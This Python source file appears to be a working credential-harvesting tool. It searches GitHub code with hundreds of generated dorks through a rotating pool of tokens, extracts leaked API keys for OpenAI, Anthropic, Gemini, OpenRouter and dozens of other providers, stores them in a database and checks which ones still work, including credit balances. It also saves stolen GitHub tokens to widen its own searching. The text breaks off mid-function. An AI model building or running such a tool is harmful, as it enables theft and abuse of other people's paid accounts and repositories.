"""UNIVERSAL LLM family hunt — OpenAI / Anthropic / Gemini / OpenRouter /
Groq / Mistral / Together / xAI / Fireworks / Replicate / Cohere.

Prefix-exact regexes (no key_patterns dependency), GitHub code search via
PAT pool, raw file fetch + rescan, then IMMEDIATE validation per provider.
OpenAI finds also get a gpt-6-luna probe (max_completion_tokens) so
GPT-6-accessible keys are flagged in plan right away.

found='uni-hunt'. Run: python universal_hunt.py [--loop]
"""
import hashlib
import os
import json
import re
import sqlite3
import subprocess
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests

DB = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data", "keys.db")
LOG = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data", "universal_hunt.log")
TOKENS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "gh_tokens.txt")
API = "https://api.github.com/search/code"
N_THREADS = 16
PAGES = 10
RAW_BUDGET = 20000
LOOP_SLEEP = 3600
FOUND = "uni-hunt"
GARBAGE = ("xxxx", "your", "YOUR", "EXAMPLE", "example", "n0tr3al",
           "placeholder", "CHANGEME", "changeme", "dummy", "DUMMY",
           "abcdefghijklmnopqrst", "1234567890abcdef", "test-key",
           "sample", "SAMPLE",
           # v4.5: extended fake-key filter (from Github-API-scan)
           "insert", "replace", "aaaaaa", "bbbb", "redacted", "masked",
           "censored", "api_key_here", "your_api_key", "replace_with",
           "fill_in", "undefined", "boilerplate", "skeleton", "mock_",
           "stub_", "todo", "fixme", "changeme", "enter_key", "put_key")

# v4.5: junk path segments — skip fixture/mock/doc files entirely
PATH_BLACKLIST = ("/test", "/__tests__", "/mock", "/__mocks__",
                  "/fixture", "/example", "/sample", "/demo", "/docs",
                  "/node_modules", "/venv/", "/.venv", "/coverage",
                  "/sandbox/", "/playground/", "/tutorial/",
                  "/boilerplate/", "/starter/", "/ISSUE_TEMPLATE")

# prefix-exact patterns: prov -> compiled regex (group 1 = key)
PATTERNS = {
    "OPENAI_PROJ": re.compile(
        r"\bsk-(?:proj|svcacct)-[A-Za-z0-9_\-]{60,250}"),
    "OPENAI_LEG": re.compile(
        r"\bsk-[A-Za-z0-9]{20}T3BlbkFJ[A-Za-z0-9]{20}\b"),
    "ANTHROPIC": re.compile(r"\bsk-ant-api0[0-9]-[A-Za-z0-9_\-]{90,}"),
    "ANTHROPIC_OAT": re.compile(r"\bsk-ant-oat01-[A-Za-z0-9_\-]{90,}"),
    "GEMINI": re.compile(r"\bAIza[0-9A-Za-z_\-]{35}\b"),
    "OPENROUTER": re.compile(r"\bsk-or-v1-[a-f0-9]{64}\b"),
    "GROQ": re.compile(r"\bgsk_[A-Za-z0-9]{52}\b"),
    "XAI": re.compile(r"\bxai-[A-Za-z0-9]{20,}\b"),
    "FIREWORKS": re.compile(r"\bfw_[A-Za-z0-9]{24}\b"),
    "REPLICATE": re.compile(r"\br8_[A-Za-z0-9]{40}\b"),
    # context-bound (no distinct prefix): env name within 60 chars
    # ENV_PRE: frontend bundlers leak keys via VITE_/NEXT_PUBLIC_/etc
    "TOGETHER": re.compile(
        r"(?i)\b(?:(?:VITE|NEXT_PUBLIC|EXPO_PUBLIC|NUXT_PUBLIC|"
        r"REACT_APP)_)?(?:TOGETHER_AI_API_KEY|TOGETHER_API_KEY)\b"
        r"[^\n]{0,60}?[=:]\s*[\"']?"
        r"([A-Za-z0-9]{28,})"),
    "COHERE": re.compile(
        r"(?i)\b(?:(?:VITE|NEXT_PUBLIC|EXPO_PUBLIC|NUXT_PUBLIC|"
        r"REACT_APP)_)?COHERE_API_KEY\b[^\n]{0,60}?[=:]\s*[\"']?"
        r"([A-Za-z0-9_\-]{32,})"),
    # v2 families
    "PERPLEXITY": re.compile(r"\bpplx-[A-Za-z0-9]{40,}\b"),
    "HUGGINGFACE": re.compile(r"\bhf_[A-Za-z0-9]{30,40}\b"),
    "ELEVENLABS": re.compile(
        r"(?i)\b(?:(?:VITE|NEXT_PUBLIC|EXPO_PUBLIC)_)?"
        r"ELEVEN_?LABS_API_KEY\b[^\n]{0,60}?[=:]\s*[\"']?"
        r"((?:sk_)?[A-Za-z0-9]{32,48})"),
    "DEEPINFRA": re.compile(
        r"(?i)\b(?:(?:VITE|NEXT_PUBLIC|EXPO_PUBLIC)_)?"
        r"DEEP_?INFRA_API_KEY\b[^\n]{0,60}?[=:]\s*[\"']?"
        r"([A-Za-z0-9_\-]{30,})"),
    "STABILITY": re.compile(
        r"(?i)\b(?:(?:VITE|NEXT_PUBLIC|EXPO_PUBLIC)_)?"
        r"(?:STABILITY_AI_API_KEY|STABILITY_API_KEY)\b"
        r"[^\n]{0,60}?[=:]\s*[\"']?(sk-[A-Za-z0-9]{40,90})"),
    # v3 families
    "NVIDIA": re.compile(r"\bnvapi-[A-Za-z0-9_\-]{40,}\b"),
    "CEREBRAS": re.compile(r"\bcsk-[A-Za-z0-9]{30,}\b"),
    "GITHUB": re.compile(r"\b(?:ghp_[A-Za-z0-9]{36}|"
                         r"github_pat_[A-Za-z0-9_]{60,90})\b"),
    "LUMA": re.compile(r"\bluma-[a-z0-9]{8}-[a-z0-9]{8}-[a-z0-9]{8}\b"),
    "DEEPSEEK": re.compile(
        r"(?i)\b(?:(?:VITE|NEXT_PUBLIC|EXPO_PUBLIC)_)?DEEPSEEK_API_KEY\b"
        r"[^\n]{0,60}?[=:]\s*[\"']?"
        r"(sk-[A-Za-z0-9]{32})"),
    "HYPERBOLIC": re.compile(
        r"(?i)\b(?:(?:VITE|NEXT_PUBLIC|EXPO_PUBLIC)_)?HYPERBOLIC_API_KEY\b"
        r"[^\n]{0,60}?[=:]\s*[\"']?"
        r"(sk-[A-Za-z0-9]{20,})"),
    "AI21": re.compile(
        r"(?i)\b(?:(?:VITE|NEXT_PUBLIC|EXPO_PUBLIC)_)?AI21_API_KEY\b"
        r"[^\n]{0,60}?[=:]\s*[\"']?"
        r"([A-Za-z0-9_\-]{30,})"),
    "WRITER": re.compile(
        r"(?i)\b(?:(?:VITE|NEXT_PUBLIC|EXPO_PUBLIC)_)?WRITER_API_KEY\b"
        r"[^\n]{0,60}?[=:]\s*[\"']?"
        r"([A-Za-z0-9_\-]{30,})"),
    "ANYSCALE": re.compile(
        r"(?i)\b(?:(?:VITE|NEXT_PUBLIC|EXPO_PUBLIC)_)?ANYSCALE_API_KEY\b"
        r"[^\n]{0,60}?[=:]\s*[\"']?"
        r"((?:ese|esk)-[A-Za-z0-9]{30,})"),
    "REKA": re.compile(
        r"(?i)\b(?:(?:VITE|NEXT_PUBLIC|EXPO_PUBLIC)_)?REKA_API_KEY\b"
        r"[^\n]{0,60}?[=:]\s*[\"']?"
        r"([A-Za-z0-9_\-]{30,})"),
    "GOOSEAI": re.compile(
        r"(?i)\b(?:(?:VITE|NEXT_PUBLIC|EXPO_PUBLIC)_)?"
        r"GOOSE_?AI_?API_KEY\b[^\n]{0,60}?[=:]\s*[\"']?"
        r"([A-Za-z0-9_\-]{30,})"),
    "FAL": re.compile(
        r"(?i)\b(?:VITE_)?FAL_KEY\b[^\n]{0,60}?[=:]\s*[\"']?"
        r"([a-f0-9]{32}:[a-f0-9]{40})"),
    "RUNWAY": re.compile(
        r"(?i)\bRUNWAYML_API_KEY\b[^\n]{0,60}?[=:]\s*[\"']?"
        r"(key-[A-Za-z0-9_\-]{20,})"),
    "ALEPHALPHA": re.compile(
        r"(?i)\b(?:ALEPH_?ALPHA_API_KEY|ALEPHALPHA_TOKEN)\b"
        r"[^\n]{0,60}?[=:]\s*[\"']?"
        r"([A-Za-z0-9_\-]{30,})"),
    # v6 (from Coff0xc/Github-API-scan)
    "META_LLAMA": re.compile(r"\bllama-[A-Za-z0-9]{32,64}\b"),
    "MOONSHOT": re.compile(r"\bmoonshot-[A-Za-z0-9]{32,64}\b"),
    "MINIMAX": re.compile(r"\bminimax-[A-Za-z0-9]{32,64}\b"),
    "PORTKEY": re.compile(r"\bpk-[A-Za-z0-9]{40,64}\b"),
    "FOREFRONT": re.compile(r"\bff-[A-Za-z0-9]{32,64}\b"),
    "COHERE_KEY": re.compile(r"\bco-[A-Za-z0-9]{40,64}\b"),
    # v6 env-bound (real key formats)
    "MOONSHOT": re.compile(
        r"(?i)\bMOONSHOT_API_KEY\b[^\n]{0,60}?[=:]\s*[\"']?"
        r"(sk-[A-Za-z0-9]{40,60})"),
    "ZHIPU": re.compile(
        r"(?i)\b(?:ZHIPU_API_KEY|ZHIPUAI_API_KEY)\b"
        r"[^\n]{0,60}?[=:]\s*[\"']?"
        r"([a-f0-9]{32}\.[A-Za-z0-9]{16})"),
    "STEPFUN": re.compile(
        r"(?i)\bSTEP_?FUN_API_KEY\b[^\n]{0,60}?[=:]\s*[\"']?"
        r"(sk-[A-Za-z0-9]{32,})"),
    "BAICHUAN": re.compile(
        r"(?i)\bBAICHUAN_API_KEY\b[^\n]{0,60}?[=:]\s*[\"']?"
        r"(sk-[A-Za-z0-9]{32,})"),
    "MINIMAX": re.compile(
        r"(?i)\bMINIMAX_API_KEY\b[^\n]{0,60}?[=:]\s*[\"']?"
        r"(eyJ[A-Za-z0-9_\-]{50,})"),
}
# match -> normalized prov for DB (OPENAI_PROJ/OPENAI_LEG -> OPENAI)
NORM = {"OPENAI_PROJ": "OPENAI", "OPENAI_LEG": "OPENAI",
        "ANTHROPIC_OAT": "ANTHROPIC_OAT", "COHERE_KEY": "COHERE"}

DORKS = [
    # OpenAI
    "\"sk-proj-\" filename:.env",
    "\"sk-proj-\" filename:py",
    "\"sk-proj-\" filename:js",
    "\"sk-proj-\" filename:json",
    "\"sk-proj-\" filename:txt",
    "\"sk-proj-\" filename:config",
    "OPENAI_API_KEY filename:.env",
    "OPENAI_API_KEY filename:properties",
    # Anthropic
    "\"sk-ant-api03\" filename:.env",
    "\"sk-ant-api03\" filename:json",
    "\"sk-ant-api03\" filename:py",
    "\"sk-ant-oat01\" filename:.env",
    "\"sk-ant-oat01\" filename:json",
    "ANTHROPIC_API_KEY filename:.env",
    # Gemini / Google
    "GEMINI_API_KEY filename:.env",
    "GEMINI_API_KEY filename:py",
    "GOOGLE_API_KEY AIza filename:.env",
    "\"AIza\" filename:.env",
    "generativeai configure filename:py",
    # OpenRouter
    "OPENROUTER_API_KEY filename:.env",
    "\"sk-or-v1\" filename:.env",
    "\"sk-or-v1\" filename:py",
    # Groq
    "GROQ_API_KEY filename:.env",
    "\"gsk_\" filename:.env",
    # xAI
    "XAI_API_KEY filename:.env",
    "\"xai-\" filename:.env",
    "XAI_API_KEY filename:json",
    # Together / Fireworks / Replicate / Cohere
    "TOGETHER_API_KEY filename:.env",
    "TOGETHER_AI_API_KEY filename:.env",
    "FIREWORKS_API_KEY filename:.env",
    "REPLICATE_API_TOKEN filename:.env",
    "COHERE_API_KEY filename:.env",
    # v2: new families + deeper file types
    "PERPLEXITY_API_KEY filename:.env",
    "\"pplx-\" filename:.env",
    "HF_TOKEN filename:.env",
    "HUGGINGFACE_API_KEY filename:.env",
    "HUGGING_FACE_HUB_TOKEN filename:.env",
    "ELEVENLABS_API_KEY filename:.env",
    "ELEVEN_LABS_API_KEY filename:.env",
    "DEEPINFRA_API_KEY filename:.env",
    "STABILITY_API_KEY filename:.env",
    # v2: frontend-exposed keys (Vite/Next/Expo leak to browser bundles)
    "VITE_OPENAI_API_KEY filename:.env",
    "VITE_GEMINI_API_KEY filename:.env",
    "VITE_GOOGLE_API_KEY filename:.env",
    "NEXT_PUBLIC_OPENAI_API_KEY filename:.env",
    "NEXT_PUBLIC_GOOGLE_API_KEY filename:.env",
    "EXPO_PUBLIC_OPENAI_API_KEY",
    # v2: deeper file types for core families
    "OPENAI_API_KEY filename:docker-compose",
    "OPENAI_API_KEY filename:txt",
    "OPENAI_API_KEY filename:log",
    "OPENAI_API_KEY filename:ipynb",
    "OPENAI_API_KEY filename:csv",
    "sk-proj filename:txt",
    "sk-proj filename:log",
    "sk-proj filename:sql",
    "sk-ant-api03 filename:txt",
    "sk-ant-api03 filename:log",
    "ANTHROPIC_API_KEY filename:json",
    "GEMINI_API_KEY filename:json",
    "GEMINI_API_KEY filename:yaml",
    "\"AIza\" filename:txt",
    "\"AIza\" filename:json",
    "\"gsk_\" filename:py",
    "GROQ_API_KEY filename:json",
    "sk-or-v1 filename:json",
    "sk-or-v1 filename:txt",
    "REPLICATE_API_TOKEN filename:json",
    "XAI_API_KEY filename:yaml",
    "ELEVENLABS_API_KEY filename:json",
    "FIREWORKS_API_KEY filename:json",
    # v3 families
    "NVIDIA_API_KEY filename:.env",
    "NVIDIA_NIM filename:.env",
    "nvapi- filename:.env",
    "nvapi- filename:py",
    "CEREBRAS_API_KEY filename:.env",
    "csk- filename:.env",
    "DEEPSEEK_API_KEY filename:.env",
    "DEEPSEEK_API_KEY filename:py",
    "DEEPSEEK_API_KEY filename:json",
    "HYPERBOLIC_API_KEY filename:.env",
    "AI21_API_KEY filename:.env",
    "WRITER_API_KEY filename:.env",
    "ANYSCALE_API_KEY filename:.env",
    "REKA_API_KEY filename:.env",
    "GOOSE_API_KEY filename:.env",
    "GOOSEAI_API_KEY filename:.env",
    "FAL_KEY filename:.env",
    "LUMA_API_KEY filename:.env",
    "RUNWAYML_API_KEY filename:.env",
    "ALEPH_ALPHA_API_KEY filename:.env",
    "ALEPHALPHA_TOKEN filename:.env",
    # GitHub PATs (fleet fuel)
    "\"ghp_\" filename:.env",
    "GITHUB_TOKEN filename:.env",
    "\"github_pat_\" filename:.env",
    "\"ghp_\" filename:txt",
    "\"ghp_\" filename:py",
    "GITHUB_TOKEN filename:py",
    "GITHUB_TOKEN filename:json",
    "GITHUB_TOKEN filename:yaml",
    "GITHUB_TOKEN filename:docker-compose",
    # v3: moar core-family file types
    "sk-ant-api03 filename:yaml",
    "sk-ant-api03 filename:sql",
    "sk-ant-api03 filename:ipynb",
    "sk-ant-oat01 filename:py",
    "OPENROUTER_API_KEY filename:json",
    "OPENROUTER_API_KEY filename:py",
    "sk-or-v1 filename:yaml",
    "sk-or-v1 filename:sql",
    "pplx- filename:py",
    "pplx- filename:json",
    "pplx- filename:txt",
    "PERPLEXITY_API_KEY filename:py",
    "gsk_ filename:json",
    "gsk_ filename:txt",
    "GROQ_API_KEY filename:py",
    "xai- filename:py",
    "xai- filename:json",
    "AIza filename:yaml",
    "AIza filename:sql",
    "AIza filename:xml",
    "GEMINI_API_KEY filename:md",
    "hf_ filename:json",
    "hf_ filename:txt",
    "HF_TOKEN filename:py",
    "HF_TOKEN filename:json",
    "HUGGINGFACEHUB_API_TOKEN filename:.env",
    "r8_ filename:txt",
    "ELEVENLABS_API_KEY filename:py",
    "fw_ filename:.env",
    "fw_ filename:json",
    "TOGETHER_API_KEY filename:py",
    "TOGETHER_AI_API_KEY filename:json",
    "STABILITY_API_KEY filename:py",
    "DEEPINFRA_API_KEY filename:json",
    "OPENAI_API_KEY filename:yaml",
    "OPENAI_API_KEY filename:md",
    "OPENAI_API_KEY filename:cfg",
    "OPENAI_API_KEY filename:ini",
    "OPENAI_API_KEY filename:rs",
    "OPENAI_API_KEY filename:go",
    "OPENAI_API_KEY filename:java",
    "sk-proj- filename:ipynb",
    "sk-proj- filename:yaml",
    "sk-proj- filename:cs",
    "sk-proj- filename:php",
]

# ── v4 BRUTAL MATRIX: env-name × file-type cross product ─────────────────
# ponytail: full cross of 30 envs × 18 types = 540 dorks; dedupe vs CORE
_ENV_BASES = [
    "OPENAI_API_KEY", "ANTHROPIC_API_KEY", "GEMINI_API_KEY",
    "GOOGLE_API_KEY", "OPENROUTER_API_KEY", "GROQ_API_KEY",
    "XAI_API_KEY", "TOGETHER_API_KEY", "TOGETHER_AI_API_KEY",
    "FIREWORKS_API_KEY", "REPLICATE_API_TOKEN", "COHERE_API_KEY",
    "PERPLEXITY_API_KEY", "HF_TOKEN", "HUGGINGFACEHUB_API_TOKEN",
    "ELEVENLABS_API_KEY", "DEEPINFRA_API_KEY", "STABILITY_API_KEY",
    "DEEPSEEK_API_KEY", "CEREBRAS_API_KEY", "NVIDIA_API_KEY",
    "HYPERBOLIC_API_KEY", "AI21_API_KEY", "WRITER_API_KEY",
    "REKA_API_KEY", "GOOSEAI_API_KEY", "FAL_KEY", "LUMA_API_KEY",
    "RUNWAYML_API_KEY", "GOOGLE_AI_STUDIO_API_KEY",
    "LLAMA_API_KEY", "MOONSHOT_API_KEY", "MINIMAX_API_KEY",
    "PORTKEY_API_KEY",
]
_FILE_TYPES = [
    ".env", "py", "js", "ts", "json", "yaml", "yml", "txt", "md",
    "docker-compose", "properties", "ini", "toml", "tfvars", "sh",
    "sql", "ipynb", "gradle",
]
_seen = set(DORKS)
for _e in _ENV_BASES:
    for _t in _FILE_TYPES:
        _d = f"{_e} filename:{_t}"
        if _d not in _seen:
            _seen.add(_d)
            DORKS.append(_d)

# prefix-token dorks across file types (raw token strings in any file)
_PREFIX_TOKENS = [
    "\"sk-proj-\"", "\"sk-ant-api03\"", "\"sk-or-v1\"", "\"gsk_\"",
    "\"pplx-\"", "\"nvapi-\"", "\"csk-\"", "\"AIza\"",
]
for _p in _PREFIX_TOKENS:
    for _t in ("txt", "json", "yaml", "sql", "log", "csv", "html",
               "lock", "cfg", "xml", "dist", "bundle", "example",
               "sample"):
        _d = f"{_p} filename:{_t}"
        if _d not in _seen:
            _seen.add(_d)
            DORKS.append(_d)

# v4.3: extension: variants — exact extension match (filename: is a
# path-substring; extension: hits every *.py file). Top families only.
_EXT_TYPES = ("py", "js", "ts", "json", "yaml", "yml", "sh", "env",
              "toml", "ini", "cfg", "sql", "ipynb", "txt", "md")
for _e in _ENV_BASES[:16]:
    for _t in _EXT_TYPES:
        _d = f"{_e} extension:{_t}"
        if _d not in _seen:
            _seen.add(_d)
            DORKS.append(_d)
for _p in ("\"sk-proj-\"", "\"sk-ant-api03\"", "\"sk-or-v1\"",
           "\"gsk_\"", "\"pplx-\"", "\"AIza\"", "\"nvapi-\"",
           "\"csk-\"", "\"hf_\"", "\"xai-\""):
    for _t in ("py", "js", "ts", "env", "json", "yaml", "txt", "md"):
        _d = f"{_p} extension:{_t}"
        if _d not in _seen:
            _seen.add(_d)
            DORKS.append(_d)

# v6: Coff0xc families — dorks + gists keywords coverage
for _p in ("\"llama-\"", "\"moonshot-\"", "\"minimax-\"",
           "\"pk-\"", "\"co-\"", "\"ff-\"", "\"sk-svcacct-\"",
           "\"sk-ant-api04\"", "\"sk-ant-api02\""):
    _d = f"{_p} filename:.env"
    if _d not in _seen:
        _seen.add(_d)
        DORKS.append(_d)
for _e in ("LLAMA_API_KEY", "MOONSHOT_API_KEY", "MINIMAX_API_KEY",
           "PORTKEY_API_KEY"):
    for _t in (".env", "py", "js", "json", "yaml", "txt"):
        _d = f"{_e} filename:{_t}"
        if _d not in _seen:
            _seen.add(_d)
            DORKS.append(_d)
print(f"[uni-hunt] DORK MATRIX: {len(DORKS)} dorks", flush=True)


def log(msg):
    line = f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {msg}\n"
    with open(LOG, "a", encoding="utf-8", errors="replace") as f:
        f.write(line)
    print(line, end="", flush=True)


class PATPool:
    def __init__(self):
        self.tokens = []
        self.dead = set()
        self._i = 0
        self._lock = threading.Lock()
        try:
            with open(TOKENS_FILE, encoding="utf-8") as f:
                for line in f:
                    t = line.strip()
                    if t.startswith(("ghp_", "github_pat_", "gho_")) \
                            and t not in self.tokens:
                        self.tokens.append(t)
        except Exception:
            pass
        try:
            r = subprocess.run(["gh", "auth", "token"], capture_output=True,
                               text=True, timeout=5)
            t = r.stdout.strip()
            if t and t not in self.tokens:
                self.tokens.append(t)
        except Exception:
            pass

    def next(self):
        with self._lock:
            live = [t for t in self.tokens if t not in self.dead]
            if not live:
                return ""
            t = live[self._i % len(live)]
            self._i += 1
            return t

    def mark_dead(self, t):
        with self._lock:
            self.dead.add(t)


POOL = PATPool()


def rest_search(query, page, endpoint=API):
    tok = POOL.next()
    if not tok:
        return None, "no tokens"
    sort = ("indexed" if endpoint == API else
            "created" if "search/issues" in endpoint else
            "committer-date")
    try:
        r = requests.get(
            endpoint,
            params={"q": query, "per_page": 100, "page": page,
                    "sort": sort, "order": "desc"},
            headers={"Authorization": f"Bearer {tok}",
                     "Accept": "application/vnd.github+json",
                     "User-Agent": "keyfarm"},
            timeout=30)
        if r.status_code == 401:
            POOL.mark_dead(tok)
            return None, "401"
        if r.status_code in (403, 429):
            return None, "rate"
        if r.status_code != 200:
            return None, f"HTTP {r.status_code}"
        return r.json().get("items", []), "ok"
    except Exception as e:
        return None, repr(e)


conn = sqlite3.connect(DB, timeout=120, check_same_thread=False,
                       isolation_level=None)
lock = threading.Lock()
dblock = threading.Lock()
seen_files = set()
raw_fetched = [0]
found_keys = {}     # hash -> (val, prov, repo) collected this run


def scan_text(text):
    """Yield (prov, key) for every pattern hit."""
    for pname, rx in PATTERNS.items():
        for m in rx.finditer(text):
            key = m.group(1) if m.groups() else m.group(0)
            key = key.strip().rstrip("\\\"'`,;")
            if key and not any(g in key for g in GARBAGE) and len(key) >= 20:
                yield NORM.get(pname, pname), key


def db_upsert(key, prov, repo):
    h = hashlib.sha1(key.encode()).hexdigest()[:16]
    with dblock:
        conn.execute(
            "INSERT INTO keys (hash, val, prov, status, found, repo) "
            "VALUES (?,?,?,?,?,?) "
            "ON CONFLICT(hash) DO UPDATE SET status='NEW', "
            "found=excluded.found, repo=excluded.repo "
            "WHERE keys.status IN ('DEAD','ERR')",
            (h, key, prov, "NEW", FOUND, repo))
    return h


def work(q):
    n_new = 0
    for page in range(1, PAGES + 1):
        items, st = rest_search(q, page)
        if items is None:
            if st == "rate":
                time.sleep(15)
                items, st = rest_search(q, page)
            if items is None:
                log(f"  {q!r} p{page}: {st}")
                return n_new
        for h in items:
            repo = h.get("repository", {}).get("full_name", "?")
            path = h.get("path", "")
            if any(b in f"/{path}" for b in PATH_BLACKLIST):
                continue
            texts = [json.dumps(h.get("text_matches", []))]
            fp = (repo, path)
            with lock:
                if fp in seen_files:
                    continue
                seen_files.add(fp)
                if raw_fetched[0] < RAW_BUDGET:
                    raw_fetched[0] += 1
                    do_raw = True
                else:
                    do_raw = False
            if do_raw:
                try:
                    raw = requests.get(
                        f"https://raw.githubusercontent.com/{repo}/HEAD/"
                        f"{path}",
                        timeout=20)
                    if raw.status_code == 200 and len(raw.text) < 2_000_000:
                        texts.append(raw.text)
                except Exception:
                    pass
            for text in texts:
                for prov, key in scan_text(text):
                    if key in found_keys:
                        continue
                    hsh = db_upsert(key, prov, f"{repo}/{path}")
                    with lock:
                        found_keys[hsh] = (key, prov, f"{repo}/{path}")
                    n_new += 1
        time.sleep(1.0)
    return n_new


# ── per-provider validation ───────────────────────────────────────────────
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; x64) AppleWebKit/537.36"}


def probe_openai(k):
    try:
        r = requests.get("https://api.openai.com/v1/models",
                         headers={**UA, "Authorization": f"Bearer {k}"},
                         timeout=20)
        if r.status_code != 200:
            return ("reject", r.status_code)
        info = "openai models OK"
        # bonus: gpt-6-luna access probe (needs max_completion_tokens)
        try:
            c = requests.post(
                "https://api.openai.com/v1/chat/completions",
                headers={**UA, "Authorization": f"Bearer {k}",
                         "Content-Type": "application/json"},
                json={"model": "gpt-6-luna",
                      "messages": [{"role": "user", "content": "hi"}],
                      "max_completion_tokens": 16},
                timeout=30)
            if c.status_code == 200:
                info += " | GPT6-LUNA LIVE"
        except Exception:
            pass
        return ("WORKING", info)
    except Exception:
        return ("net", None)


def probe_anthropic(k):
    try:
        r = requests.get("https://api.anthropic.com/v1/models",
                         headers={**UA, "x-api-key": k,
                                  "anthropic-version": "2023-06-01"},
                         timeout=20)
        return ("WORKING", f"anthropic models OK") if r.status_code == 200 \
            else ("reject", r.status_code)
    except Exception:
        return ("net", None)


def probe_anthropic_oat(k):
    try:
        r = requests.get(
            "https://api.anthropic.com/v1/models",
            headers={**UA, "Authorization": f"Bearer {k}",
                     "anthropic-version": "2023-06-01",
                     "anthropic-beta": "oauth-2025-04-20"},
            timeout=20)
        return ("WORKING", "oat models OK") if r.status_code == 200 \
            else ("reject", r.status_code)
    except Exception:
        return ("net", None)


def probe_gemini(k):
    try:
        r = requests.get(
            "https://generativelanguage.googleapis.com/v1beta/models",
            params={"key": k}, timeout=20)
        if r.status_code == 200:
            try:
                n = len(r.json().get("models", []))
            except Exception:
                n = 0
            return ("WORKING", f"gemini models={n}")
        return ("reject", r.status_code)
    except Exception:
        return ("net", None)


def probe_openrouter(k):
    try:
        r = requests.get("https://openrouter.ai/api/v1/credits",
                         headers={**UA, "Authorization": f"Bearer {k}"},
                         timeout=20)
        if r.status_code == 200:
            try:
                d = r.json().get("data", {})
                return ("WORKING",
                        f"openrouter credits total=${d.get('total_credits')}"
                        f" used=${d.get('total_usage')}")
            except Exception:
                return ("WORKING", "openrouter OK")
        if r.status_code == 401:
            return ("reject", 401)
        # fallback to key listing
        r2 = requests.get("https://openrouter.ai/api/v1/key",
                          headers={**UA, "Authorization": f"Bearer {k}"},
                          timeout=20)
        return ("WORKING", "openrouter key OK") if r2.status_code == 200 \
            else ("reject", r2.status_code)
    except Exception:
        return ("net", None)


def _models_probe(name, url, k, hdr_extra=None):
    try:
        r = requests.get(url, headers={**UA, "Authorization": f"Bearer {k}",
                                       **(hdr_extra or {})}, timeout=20)
        if r.status_code == 200:
            return ("WORKING", f"{name} models OK")
        if r.status_code in (401, 403):
            return ("reject", r.status_code)
        # 404/5xx/etc: unverified endpoint — do not poison DEAD
        return ("net", r.status_code)
    except Exception:
        return ("net", None)



GH_NEW = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                      "data", "gh_new_tokens.txt")


def probe_github(k):
    """GitHub PAT: alive check + save login to fuel the fleet."""
    try:
        r = requests.get("https://api.github.com/user",
                         headers={"User-Agent": "k",
                                  "Authorization": f"Bearer {k}"},
                         timeout=15)
        if r.status_code == 200:
            login = r.json().get("login", "?")
            try:
                with open(GH_NEW, "a", encoding="utf-8") as f:
                    f.write(f"{k}\n")
            except Exception:
                pass
            return ("WORKING", f"github {login}")
        if r.status_code == 401:
            return ("reject", 401)
        return ("net", None)
    except Exception:
        return ("net", None)
PROBES = {
    "OPENAI": probe_openai,
    "ANTHROPIC": probe_anthropic,
    "ANTHROPIC_OAT": probe_anthropic_oat,
    "GEMINI": probe_gemini,
    "OPENROUTER": probe_openrouter,
    "GROQ": lambda k: _models_probe(
        "groq", "https://api.groq.com/openai/v1/models", k),
    "XAI": lambda k: _models_probe("xai", "https://api.x.ai/v1/models", k),
    "TOGETHER": lambda k: _models_probe(
        "together", "https://api.together.xyz/v1/models", k),
    "FIREWORKS": lambda k: _models_probe(
        "fireworks", "https://api.fireworks.ai/inference/v1/models", k),
    "COHERE": lambda k: _models_probe(
        "cohere", "https://api.cohere.ai/v1/models", k),
    "REPLICATE": lambda k: _models_probe(
        "replicate", "https://api.replicate.com/v1/account", k),
    "PERPLEXITY": lambda k: _models_probe(
        "perplexity", "https://api.perplexity.ai/v1/models", k),
    "HUGGINGFACE": lambda k: _models_probe(
        "hf", "https://huggingface.co/api/whoami-v2", k),
    "DEEPINFRA": lambda k: _models_probe(
        "deepinfra", "https://api.deepinfra.com/v1/openai/models", k),
    "ELEVENLABS": lambda k: _models_probe(
        "elevenlabs", "https://api.elevenlabs.io/v1/user", k,
        hdr_extra={"xi-api-key": k}),
    "STABILITY": lambda k: _models_probe(
        "stability", "https://api.stability.ai/v1/user/account", k),
    # v3 probes (smoke-verified: 401/403 on bogus key)
    "CEREBRAS": lambda k: _models_probe(
        "cerebras", "https://api.cerebras.ai/v1/models", k),
    "DEEPSEEK": lambda k: _models_probe(
        "deepseek", "https://api.deepseek.com/models", k),
    "HYPERBOLIC": lambda k: _models_probe(
        "hyperbolic", "https://api.hyperbolic.xyz/v1/models", k),
    "WRITER": lambda k: _models_probe(
        "writer", "https://api.writer.com/v1/models", k),
    "REKA": lambda k: _models_probe(
        "reka", "https://api.reka.ai/v1/models", k),
    # NVIDIA /v1/models is public-200 (not a validator); AI21/ANYSCALE/
    # GOOSEAI/LUMA endpoints 404 — families stay NEW, no probe
    "GITHUB": probe_github,
    # v6 probes (smoke-verified 401/403)
    "META_LLAMA": lambda k: _models_probe(
        "llama", "https://api.llama.com/compat/v1/models", k),
    "MOONSHOT": lambda k: _models_probe(
        "moonshot", "https://api.moonshot.cn/v1/models", k),
    "MINIMAX": lambda k: _models_probe(
        "minimax", "https://api.minimax.io/v1/models", k),
    "PORTKEY": lambda k: _models_probe(
        "portkey", "https://api.portkey.ai/v1/models", k),
    "COHERE_KEY": lambda k: _models_probe(
        "cohere", "https://api.cohere.ai/v1/models", k),
    "ZHIPU": lambda k: _models_probe(
        "zhipu", "https://open.bigmodel.cn/api/paas/v4/models", k),
    "STEPFUN": lambda k: _models_probe(
        "stepfun", "https://api.stepfun.com/v1/models", k),
    "BAICHUAN": lambda k: _models_probe(
        "baichuan", "https://api.baichuan-ai.com/v1/models", k),
}


def validate_key(hsh, key, prov, repo):
    fn = PROBES.get(prov)
    if fn is None:
        return ("NEW", "no probe")
    st, info = fn(key)
    if st == "WORKING":
        with dblock:
            conn.execute(
                "UPDATE keys SET status='WORKING', plan=?, remaining=? "
                "WHERE hash=?", (str(info)[:200], "OK", hsh))
        return ("WORKING", info)
    if st == "net":
        return ("NEW", "net-fail")
    with dblock:
        conn.execute("UPDATE keys SET status='DEAD' WHERE hash=?", (hsh,))
    return ("DEAD", info)


def main():
    log(f"=== universal hunt START pats={len(POOL.tokens)} "
        f"dorks={len(DORKS)} pages={PAGES} ===")
    n = 0
    with ThreadPoolExecutor(max_workers=N_THREADS) as ex:
        futs = [ex.submit(work, q) for q in DORKS]
        for f in as_completed(futs):
            try:
